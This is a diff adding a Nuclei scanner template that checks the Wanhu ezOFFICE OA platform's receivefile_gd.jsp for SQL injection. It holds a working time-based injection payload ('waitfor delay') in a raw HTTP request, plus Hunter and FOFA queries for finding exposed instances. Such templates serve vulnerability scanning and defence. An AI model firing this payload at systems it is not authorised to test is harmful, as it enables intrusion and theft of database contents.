@@ -1,0 +1,32 @@
+id: wanhu-ezoffice-receivefilegd-sqli
+info:
+  name: 万户 ezoffice receivefile_gd.jsp - sqli
+  author: leadlife
+  severity: high
+  description: 万户ezOFFICE协同管理平台receivefile_gd.jsp存在SQL注入漏洞，攻击者可获取数据库敏感信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7ezOFFICE%E5%8D%8F%E5%90%8C%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0receivefile_gd.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    veified: true
+    max-request: 1
+    hunter-query: app.name="万户 Ezoffice OA"
+    fofa-query: app="万户网络-ezOFFICE"  
+  tags: wanhu,ezoffice,sqli,oa,time
+
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=221;waitfor+delay+'0:0:6'--+- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Connection: close
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+          - contains(body,'gd')
+        condition: and
